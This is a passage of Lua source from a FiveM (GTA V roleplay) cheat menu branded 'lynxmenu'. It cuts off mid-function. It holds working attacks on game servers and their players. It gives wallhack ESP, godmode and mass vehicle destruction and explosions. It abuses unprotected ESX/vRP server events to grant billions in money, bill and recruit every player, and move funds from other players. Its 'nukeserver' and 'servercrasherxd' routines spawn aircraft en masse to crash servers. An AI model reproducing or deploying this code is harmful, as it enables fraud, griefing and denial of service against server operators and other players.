    and GetPlayerPed(M)  ~= GetPlayerPed(-1) then ped = GetPlayerPed(M) blip = GetBlipFromEntity(ped) x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(M), true)) distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(M), false, false, "", false) wantedLvl = GetPlayerWantedLevel(M) if dt then Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true) if wantedLvl then Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true) Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
    else Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false) end
    else Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false) Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false) Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false) end;
    if ds then
    if not DoesBlipExist(blip) then blip = AddBlipForEntity(ped) SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, M)
    else veh = GetVehiclePedIsIn(ped, false) blipSprite = GetBlipSprite(blip) if not GetEntityHealth(ped) then
    if blipSprite ~= 274 then SetBlipSprite(blip, 274) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, M) end elseif veh then vehClass = GetVehicleClass(veh) vehModel = GetEntityModel(veh) if vehClass == 15 then
    if blipSprite ~= 422 then SetBlipSprite(blip, 422) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, M) end elseif vehClass == 16 then
    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
    if blipSprite ~= 424 then SetBlipSprite(blip, 424) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, M) end elseif blipSprite ~= 423 then SetBlipSprite(blip, 423) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) end elseif vehClass == 14 then
    if blipSprite ~= 427 then SetBlipSprite(blip, 427) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) end elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("limo2") then
    if blipSprite ~= 426 then SetBlipSprite(blip, 426) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, M) end elseif vehModel == GetHashKey("rhino") then
    if blipSprite ~= 421 then SetBlipSprite(blip, 421) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false) SetBlipNameToPlayerName(blip, M) end elseif blipSprite ~= 1 then SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, M) end; passengers = GetVehicleNumberOfPassengers(veh) if passengers then
    if not IsVehicleSeatFree(veh, -1) then passengers = passengers + 1 end; ShowNumberOnBlip(blip, passengers)
    else HideNumberOnBlip(blip) end
    else HideNumberOnBlip(blip) if blipSprite ~= 1 then SetBlipSprite(blip, 1) Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true) SetBlipNameToPlayerName(blip, M) end end; SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) SetBlipNameToPlayerName(blip, M) SetBlipScale(blip, 0.85) if IsPauseMenuActive() then SetBlipAlpha(blip, 255)
    else x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(M), true)) distance = math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) + 900;
    if distance < 0 then distance = 0 elseif distance > 255 then distance = 255 end; SetBlipAlpha(blip, distance) end end
    else RemoveBlip(blip) end end end end end) local dw = {
    __gc = function(dx) if dx.destructor and dx.handle then dx.destructor(dx.handle) end;
    dx.destructor = nil;
    dx.handle = nil end
}

function EnumerateEntities(dy, dz, dA) return coroutine.wrap(function() local dB, M = dy() if not M or M == 0 then dA(dB) return end; local dx = {
        handle = dB, destructor = dA
    }
    setmetatable(dx, dw) local dC = true; repeat coroutine.yield(M) dC, M = dz(dB) until not dC; dx.destructor, dx.handle = nil, nil; dA(dB) end) end;

function EnumeratePeds() return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end;

function EnumerateVehicles() return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end;

function EnumerateObjects() return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject) end;

function RotationToDirection(dD) local dE = dD.z * 0.0174532924;
local dF = dD.x * 0.0174532924;
local dG = math.abs(math.cos(dF)) return vector3(-math.sin(dE) * dG, math.cos(dE) * dG, math.sin(dF)) end;

function OscillateEntity(entity, dH, dI, dJ, dK) if entity ~= 0 and entity ~= nil then local dL = (dI - dH) * dJ * dJ - 2.0 * dJ * dK * GetEntityVelocity(entity) ApplyForceToEntity(entity, 3, dL.x, dL.y, dL.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true) end end;
local dM = true;
Citizen.CreateThread(function() while bL do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), dM, 0) if SuperJump
    then SetSuperJumpThisFrame(PlayerId(-1)) end;
    if InfStamina then RestorePlayerStamina(PlayerId(-1), 1.0) end;
    if fastrun then SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49) SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
    else SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0) SetPedMoveRateOverride(GetPlayerPed(-1), 1.0) end;
    if VehicleGun then local dN = "Freight"
    local cX = GetEntityCoords(GetPlayerPed(-1), true) if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then aM("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!", false) GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true) pittore = 595002506707337237; SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999) if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL") then
    if IsPedShooting(GetPlayerPed(-1)) then
    while not HasModelLoaded(GetHashKey(dN)) do Citizen.Wait(0) RequestModel(GetHashKey(dN)) end;
    local veh = CreateVehicle(GetHashKey(dN), cX.x + 5 * GetEntityForwardX(GetPlayerPed(-1)), cX.y + 5 * GetEntityForwardY(GetPlayerPed(-1)), cX.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true) SetEntityAsNoLongerNeeded(veh) SetVehicleForwardSpeed(veh, 150.0) end end end end;
    if DeleteGun then local dO = getEntity(PlayerId(-1)) if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then aM('~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!') GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true) SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999) if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
    if IsPlayerFreeAiming(PlayerId(-1)) then
    if IsEntityAPed(dO) then
    if IsPedInAnyVehicle(dO, true) then
    if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(GetVehiclePedIsIn(dO, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(dO, true)) SetEntityAsMissionEntity(dO, 1, 1) DeleteEntity(dO) aM('~g~Deleted!') end
    else if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(dO, 1, 1) DeleteEntity(dO) aM('~g~Deleted!') end end
    else if IsControlJustReleased(1, 142) then SetEntityAsMissionEntity(dO, 1, 1) DeleteEntity(dO) aM('~g~Deleted!') end end end end end end;
    if fuckallcars then
    for aP in EnumerateVehicles() do
        if not
    IsPedAPlayer(GetPedInVehicleSeat(aP, -1)) then SetVehicleHasBeenOwnedByPlayer(aP, false) SetEntityAsMissionEntity(aP, false, false) StartVehicleAlarm(aP) DetachVehicleWindscreen(aP) SmashVehicleWindow(aP, 0) SmashVehicleWindow(aP, 1) SmashVehicleWindow(aP, 2) SmashVehicleWindow(aP, 3) SetVehicleTyreBurst(aP, 0, true, 1000.0) SetVehicleTyreBurst(aP, 1, true, 1000.0) SetVehicleTyreBurst(aP, 2, true, 1000.0) SetVehicleTyreBurst(aP, 3, true, 1000.0) SetVehicleTyreBurst(aP, 4, true, 1000.0) SetVehicleTyreBurst(aP, 5, true, 1000.0) SetVehicleTyreBurst(aP, 4, true, 1000.0) SetVehicleTyreBurst(aP, 7, true, 1000.0) SetVehicleDoorBroken(aP, 0, true) SetVehicleDoorBroken(aP, 1, true) SetVehicleDoorBroken(aP, 2, true) SetVehicleDoorBroken(aP, 3, true) SetVehicleDoorBroken(aP, 4, true) SetVehicleDoorBroken(aP, 5, true) SetVehicleDoorBroken(aP, 6, true) SetVehicleDoorBroken(aP, 7, true) SetVehicleLights(aP, 1) Citizen.InvokeNative(0x1FD09E7390A74D54, aP, 1) SetVehicleNumberPlateTextIndex(aP, 5) SetVehicleNumberPlateText(aP, "LynxMenu") SetVehicleDirtLevel(aP, 10.0) SetVehicleModColor_1(aP, 1) SetVehicleModColor_2(aP, 1) SetVehicleCustomPrimaryColour(aP, 255, 51, 255) SetVehicleCustomSecondaryColour(aP, 255, 51, 255) SetVehicleBurnout(aP, true) end end end;
    if destroyvehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleUndriveable(vehicle, true) SetVehicleEngineHealth(vehicle, 0) end end end;
    if alarmvehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) SetVehicleAlarm(vehicle, true) StartVehicleAlarm(vehicle) end end end;
    if explodevehicles then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then NetworkRequestControlOfEntity(vehicle) NetworkExplodeVehicle(vehicle, true, true, false) end end end;
    if huntspam then Citizen.Wait(1) TriggerServerEvent('esx-qalle-hunting:reward', 20000) TriggerServerEvent('esx-qalle-hunting:sell') end;
    if deletenearestvehicle then
    for vehicle in EnumerateVehicles() do
        if vehicle ~=
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(vehicle, true)) SetEntityAsMissionEntity(vehicle, 1, 1) DeleteEntity(vehicle) end end end;
    if freezeplayer then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer)) end;
    if freezeall then
    for i = 0, 128 do ClearPedTasksImmediately(GetPlayerPed(i)) end end;
    if esp then
    for i = 0, 128 do
        if i ~=
    PlayerId(-1) and GetPlayerServerId(i)  ~= 0 then local ah = f(1.0) local dP = GetPlayerPed(i) local dQ, dR, dS = table.unpack(GetEntityCoords(PlayerPedId(-1))) local x, y, z = table.unpack(GetEntityCoords(dP)) local dT = "~h~Name: "..GetPlayerName(i)..
    "\nServer ID: "..GetPlayerServerId(i)..
    "\nPlayer ID: "..i..
    "\nDist: "..math.round(GetDistanceBetweenCoords(dQ, dR, dS, x, y, z, true), 1) if IsPedInAnyVehicle(dP, true) then local dU = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(dP)))) dT = dT..
    "\nVeh: "..dU end;
    if espinfo and esp then DrawText3D(x, y, z - 1.0, dT, ah.r, ah.g, ah.b) end;
    if espbox and esp then LineOneBegin = GetOffsetFromEntityInWorldCoords(dP, -0.3, -0.3, -0.9) LineOneEnd = GetOffsetFromEntityInWorldCoords(dP, 0.3, -0.3, -0.9) LineTwoBegin = GetOffsetFromEntityInWorldCoords(dP, 0.3, -0.3, -0.9) LineTwoEnd = GetOffsetFromEntityInWorldCoords(dP, 0.3, 0.3, -0.9) LineThreeBegin = GetOffsetFromEntityInWorldCoords(dP, 0.3, 0.3, -0.9) LineThreeEnd = GetOffsetFromEntityInWorldCoords(dP, -0.3, 0.3, -0.9) LineFourBegin = GetOffsetFromEntityInWorldCoords(dP, -0.3, -0.3, -0.9) TLineOneBegin = GetOffsetFromEntityInWorldCoords(dP, -0.3, -0.3, 0.8) TLineOneEnd = GetOffsetFromEntityInWorldCoords(dP, 0.3, -0.3, 0.8) TLineTwoBegin = GetOffsetFromEntityInWorldCoords(dP, 0.3, -0.3, 0.8) TLineTwoEnd = GetOffsetFromEntityInWorldCoords(dP, 0.3, 0.3, 0.8) TLineThreeBegin = GetOffsetFromEntityInWorldCoords(dP, 0.3, 0.3, 0.8) TLineThreeEnd = GetOffsetFromEntityInWorldCoords(dP, -0.3, 0.3, 0.8) TLineFourBegin = GetOffsetFromEntityInWorldCoords(dP, -0.3, -0.3, 0.8) ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(dP, -0.3, 0.3, 0.8) ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(dP, -0.3, 0.3, -0.9) ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(dP, 0.3, 0.3, 0.8) ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(dP, 0.3, 0.3, -0.9) ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(dP, -0.3, -0.3, 0.8) ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(dP, -0.3, -0.3, -0.9) ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(dP, 0.3, -0.3, 0.8) ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(dP, 0.3, -0.3, -0.9) DrawLine(LineOneBegin.x, LineOneBegin.y, LineOneBegin.z, LineOneEnd.x, LineOneEnd.y, LineOneEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(LineTwoBegin.x, LineTwoBegin.y, LineTwoBegin.z, LineTwoEnd.x, LineTwoEnd.y, LineTwoEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(LineThreeBegin.x, LineThreeBegin.y, LineThreeBegin.z, LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(LineThreeEnd.x, LineThreeEnd.y, LineThreeEnd.z, LineFourBegin.x, LineFourBegin.y, LineFourBegin.z, ah.r, ah.g, ah.b, 255) DrawLine(TLineOneBegin.x, TLineOneBegin.y, TLineOneBegin.z, TLineOneEnd.x, TLineOneEnd.y, TLineOneEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(TLineTwoBegin.x, TLineTwoBegin.y, TLineTwoBegin.z, TLineTwoEnd.x, TLineTwoEnd.y, TLineTwoEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(TLineThreeBegin.x, TLineThreeBegin.y, TLineThreeBegin.z, TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(TLineThreeEnd.x, TLineThreeEnd.y, TLineThreeEnd.z, TLineFourBegin.x, TLineFourBegin.y, TLineFourBegin.z, ah.r, ah.g, ah.b, 255) DrawLine(ConnectorOneBegin.x, ConnectorOneBegin.y, ConnectorOneBegin.z, ConnectorOneEnd.x, ConnectorOneEnd.y, ConnectorOneEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(ConnectorTwoBegin.x, ConnectorTwoBegin.y, ConnectorTwoBegin.z, ConnectorTwoEnd.x, ConnectorTwoEnd.y, ConnectorTwoEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(ConnectorThreeBegin.x, ConnectorThreeBegin.y, ConnectorThreeBegin.z, ConnectorThreeEnd.x, ConnectorThreeEnd.y, ConnectorThreeEnd.z, ah.r, ah.g, ah.b, 255) DrawLine(ConnectorFourBegin.x, ConnectorFourBegin.y, ConnectorFourBegin.z, ConnectorFourEnd.x, ConnectorFourEnd.y, ConnectorFourEnd.z, ah.r, ah.g, ah.b, 255) end;
    if esplines and esp then DrawLine(dQ, dR, dS, x, y, z, ah.r, ah.g, ah.b, 255) end end end end;
    if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true) end;
    if waterp and IsPedInAnyVehicle(PlayerPedId(-1), true) then SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true) end;
    if oneshot then SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0) local dV = getEntity(PlayerId(-1)) if IsEntityAPed(dV) then
    if IsPedInAnyVehicle(dV, true) then
    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
    if IsControlJustReleased(1, 69) then NetworkExplodeVehicle(GetVehiclePedIsIn(dV, true), true, true, 0) end
    else if IsControlJustReleased(1, 142) and oneshotcar then NetworkExplodeVehicle(GetVehiclePedIsIn(dV, true), true, true, 0) end end end end
    else SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0) end;
    if rainbowf then
    for i = 1, 7 do Citizen.Wait(100) SetPedWeaponTintIndex(GetPlayerPed(-1), 1198879012, i) i = i + 1;
    if i == 7 then i = 1 end end end;
    if BlowDrugsUp then Citizen.CreateThread(function() TriggerServerEvent("esx_drugs:startHarvestWeed") TriggerServerEvent("esx_drugs:startHarvestCoke") TriggerServerEvent("esx_drugs:startHarvestMeth") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startTransformWeed") TriggerServerEvent("esx_drugs:startTransformCoke") TriggerServerEvent("esx_drugs:startTransformMeth") TriggerServerEvent("esx_drugs:startTransformOpium") TriggerServerEvent("esx_drugs:startSellWeed") TriggerServerEvent("esx_drugs:startSellCoke") TriggerServerEvent("esx_drugs:startSellMeth") TriggerServerEvent("esx_drugs:startSellOpium") Citizen.Wait(1000) end) end;
    if blowall then
    for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
            141, 211, 255
        }, "^"..av..
        "lynxmenu.com - Cheats and Anti-Lynx") end;
    for i = 0, 128 do Citizen.Wait(500) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end;
    if crosshair then ShowHudComponentThisFrame(14) end;
    if crosshairc then cr("~r~+", 0.495, 0.484) end;
    if crosshairc2 then cr("~r~.", 0.4968, 0.478) end;
    if du then local dW = false; local dX = 130; local cx = 0;
    for M = 0, 128 do
        if NetworkIsPlayerActive(M)
    and GetPlayerPed(M)  ~= GetPlayerPed(-1) then ped = GetPlayerPed(M) blip = GetBlipFromEntity(ped) x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(M), true)) distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true)) if dW then
    if NetworkIsPlayerTalking(M) then local dY = f(1.0) DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M)..
        "  |  "..GetPlayerName(M), dY.r, dY.g, dY.b)
    else DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M)..
        "  |  "..GetPlayerName(M), 255, 255, 255) end end;
    if distance < dX then
    if not dW then
    if NetworkIsPlayerTalking(M) then local dY = f(1.0) DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M)..
        "  |  "..GetPlayerName(M), dY.r, dY.g, dY.b)
    else DrawText3D(x2, y2, z2 + 1.2, GetPlayerServerId(M)..
        "  |  "..GetPlayerName(M), 255, 255, 255) end end end end end end;
    if showCoords then x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true)) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) cr("~r~X:~s~ "..roundx, 0.05, 0.00) cr("~r~Y:~s~ "..roundy, 0.11, 0.00) cr("~r~Z:~s~ "..roundz, 0.17, 0.00) end;

    function carthieftroll() for i = 0, 128 do local cM = GetEntityCoords(GetPlayerPed(i)) TriggerServerEvent("esx_carthief:alertcops", cM.x, cM.y, cM.z) end end;

    function automaticmoneyesx() local j = KeyboardInput("Warning, this value can be multiplied!!!", "", 100) if dv then
    if j ~= ""
    then local confirm = KeyboardInput("Are you sure? y/n", "", 0) if confirm == "y"
    then end; aM("~h~~g~Testing all ~y~ESX ~g~scripts~s~.", true) TriggerServerEvent("esx_carthief:pay", j) TriggerServerEvent("esx_jobs:caution", "give_back", j) TriggerServerEvent("esx_fueldelivery:pay", j) TriggerServerEvent("esx_carthief:pay", j) TriggerServerEvent("esx_godirtyjob:pay", j) TriggerServerEvent("esx_pizza:pay", j) TriggerServerEvent("esx_ranger:pay", j) TriggerServerEvent("esx_garbagejob:pay", j) TriggerServerEvent("esx_truckerjob:pay", j) TriggerServerEvent("AdminMenu:giveBank", j) TriggerServerEvent("AdminMenu:giveCash", j) TriggerServerEvent("esx_gopostaljob:pay", j) TriggerServerEvent("esx_banksecurity:pay", j) TriggerServerEvent("esx_slotmachine:sv:2", j) elseif confirm == "n"
    then aM("~h~~b~Operation cancelled~s~.", false)
    else aM("~h~~b~Invalid Confirmation~s~.", true) aM("~h~~b~Operation cancelled~s~.", false) end end end;

    function vrpdestroy() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
            141, 211, 255
        }, "^"..av..
        "lynxmenu.com - Cheats and Anti-Lynx") end;
    TriggerServerEvent("lscustoms:payGarage", {
        costs = -99999999
    }) TriggerServerEvent("vrp_slotmachine:server:2", 999999999) TriggerServerEvent("Banca:deposit", 999999999) TriggerServerEvent("bank:deposit", 999999999) local dZ = GetPlayerServerId(PlayerId()) for i = 0, 128 do TriggerEvent("bank:transfer", dZ, GetPlayerServerId(i), 99999999) end end;
    if haharip then esxdestroyv2() nukeserver() end;

    function esxdestroyv2() Citizen.CreateThread(function() TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999) TriggerServerEvent("esx_fueldelivery:pay", 9999999999) TriggerServerEvent("esx_carthief:pay", 9999999999) TriggerServerEvent("esx_godirtyjob:pay", 9999999999) TriggerServerEvent("esx_pizza:pay", 9999999999) TriggerServerEvent("esx_ranger:pay", 9999999999) TriggerServerEvent("esx_garbagejob:pay", 9999999999) TriggerServerEvent("esx_truckerjob:pay", 9999999999) TriggerServerEvent("AdminMenu:giveBank", 9999999999) TriggerServerEvent("AdminMenu:giveCash", 9999999999) TriggerServerEvent("esx_gopostaljob:pay", 9999999999) TriggerServerEvent("esx_banksecurity:pay", 9999999999) TriggerServerEvent("esx_slotmachine:sv:2", 9999999999) TriggerServerEvent("adminmenu:cashoutall") for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
                141, 211, 255
            }, "^"..av..
            "lynxmenu.com - Cheats and Anti-Lynx") end;
        for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 1254756) TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "Purposeless", "lynxmenu.com - Cheats and Anti-Lynx", 43161337) TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3) TriggerServerEvent("NB:recruterplayer", i, "police", 3) end end) end;

    function giveeveryone() Citizen.CreateThread(function() TriggerServerEvent("esx_jobs:caution", "give_back", 9999999999) TriggerServerEvent("esx_fueldelivery:pay", 9999999999) TriggerServerEvent("esx_carthief:pay", 9999999999) TriggerServerEvent("esx_godirtyjob:pay", 9999999999) TriggerServerEvent("esx_pizza:pay", 9999999999) TriggerServerEvent("esx_ranger:pay", 9999999999) TriggerServerEvent("esx_garbagejob:pay", 9999999999) TriggerServerEvent("esx_truckerjob:pay", 9999999999) TriggerServerEvent("AdminMenu:giveBank", 9999999999) TriggerServerEvent("AdminMenu:giveCash", 9999999999) TriggerServerEvent("esx_gopostaljob:pay", 9999999999) TriggerServerEvent("esx_banksecurity:pay", 9999999999) TriggerServerEvent("esx_slotmachine:sv:2", 9999999999) for i = 0, 128 do TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 125475600) TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 125475600) end end) end;

    function nukeserver() Citizen.CreateThread(function() local d_ = "Avenger"
        local e0 = "CARGOPLANE"
        local e1 = "luxor"
        local e2 = "maverick"
        local e3 = "blimp2"
        while not HasModelLoaded(GetHashKey(e0)) do Citizen.Wait(0) RequestModel(GetHashKey(e0)) end; while not HasModelLoaded(GetHashKey(e1)) do Citizen.Wait(0) RequestModel(GetHashKey(e1)) end;
        while not HasModelLoaded(GetHashKey(d_)) do Citizen.Wait(0) RequestModel(GetHashKey(d_)) end;
        while not HasModelLoaded(GetHashKey(e2)) do Citizen.Wait(0) RequestModel(GetHashKey(e2)) end;
        while not HasModelLoaded(GetHashKey(e3)) do Citizen.Wait(0) RequestModel(GetHashKey(e3)) end;
        for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
                141, 211, 255
            }, "^"..av..
            "lynxmenu.com - Cheats and Anti-Lynx") end;
        for i = 0, 128 do local e1 = CreateVehicle(GetHashKey(d_), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(d_), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(d_), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(e0), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(e0), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(e0), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(e1), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(e1), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(e1), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(e2), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(e2), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(e2), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(e3), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(e3), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(e3), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true) end end) end;
    if servercrasherxd then Citizen.CreateThread(function() local d_ = "Avenger"
        local e0 = "CARGOPLANE"
        local e1 = "luxor"
        local e2 = "maverick"
        local e3 = "blimp2"
        while not HasModelLoaded(GetHashKey(e0)) do Citizen.Wait(0) RequestModel(GetHashKey(e0)) end; while not HasModelLoaded(GetHashKey(e1)) do Citizen.Wait(0) RequestModel(GetHashKey(e1)) end;
        while not HasModelLoaded(GetHashKey(d_)) do Citizen.Wait(0) RequestModel(GetHashKey(d_)) end;
        while not HasModelLoaded(GetHashKey(e2)) do Citizen.Wait(0) RequestModel(GetHashKey(e2)) end;
        while not HasModelLoaded(GetHashKey(e3)) do Citizen.Wait(0) RequestModel(GetHashKey(e3)) end;
        for i = 0, 128 do TriggerServerEvent("adminmenu:allowall") for au = 100, 150 do local e1 = CreateVehicle(GetHashKey(d_), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(d_), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(d_), 2 * GetEntityCoords(GetPlayerPed(i)) + au, true, true) and CreateVehicle(GetHashKey(e0), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e0), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e0), 2 * GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e1), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e1), 2 * GetEntityCoords(GetPlayerPed(i)) + au, true, true) and CreateVehicle(GetHashKey(e2), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e2), GetEntityCoords(GetPlayerPed(i)) - au, true, true) and CreateVehicle(GetHashKey(e2), 2 * GetEntityCoords(GetPlayerPed(i)) + au, true, true) and 